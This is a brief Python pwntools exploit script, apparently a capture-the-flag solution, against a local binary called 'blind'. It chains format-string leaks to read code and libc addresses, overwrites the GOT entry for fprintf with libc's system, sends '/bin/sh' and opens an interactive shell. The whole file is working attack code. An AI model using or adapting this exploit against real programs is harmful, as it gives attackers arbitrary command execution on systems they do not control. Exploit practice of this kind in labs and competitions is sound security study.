from pwn import *
from frmstr import *

p = process('blind')
saveSocket = p

base_addr = 0x08048000

data = leak_code(p,0x0804852b,0x100)
print disasm(data,arch='i386')
d, dynamic_ptr = leak_libc_ptr(p,base_addr)
system_libc  = leak_libc(d,'system')
fprintf_libc = leak_libc(d,'fprintf')

got_addr = find_got(p,dynamic_ptr)
printf_got = resolve_got(got_addr, fprintf_libc)

send_payload(p,printf_got, system_libc,6)
p.sendline('/bin/sh\x00')
p.interactive()
p.close()

